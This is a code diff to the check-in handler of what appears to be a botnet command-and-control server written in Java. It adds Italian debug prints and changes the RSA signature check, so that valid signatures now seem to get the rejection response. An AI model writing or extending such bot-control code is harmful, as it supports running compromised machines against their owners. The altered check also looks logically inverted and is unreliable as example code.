@@ -66,25 +66,30 @@ public class CommandController {
 		String idBot;
 		Boolean flag = false;
 		if (configEngine.isCommandandconquerStatus()) {
+
 			if (data != null) {
+				System.out.println("i dati non sono null");
 				String[] msgs = data.split("<CS>");
 				idBot = msgs[0];
 				String idBotSign = msgs[1];
 				Bot b = cmm.getbServ().searchBotId(idBot);
 				if (b != null) {
+					System.out.println("conosco gia il bot");
 					try {
-						flag = cmm.getPki().validateSignedMessageRSA(idBot, idBotSign,
-								cmm.getPki().rebuildPuK(b.getPubKey()));
-						if (!flag)
+						flag = cmm.getPki().validateSignedMessageRSA(idBot, idBotSign,cmm.getPki().rebuildPuK(b.getPubKey()));
+						System.out.println("Ritorno verifica "+flag);
+						if (flag)
 							response = new Pairs<Long, Integer>(new Long(-1), -1);
+						else
+							response = cmm.authReq(idBot);
 					} catch (InvalidKeyException | SignatureException e) {
-						// TODO Auto-generated catch block
 						e.printStackTrace();
 					}
 				} else 
 					response = cmm.authReq(idBot);
-				}
+			}
 		} else {
+			System.out.println("non sono cec");
 			error.sendError(HttpStatus.SC_NOT_FOUND);
 		}
 		return response;
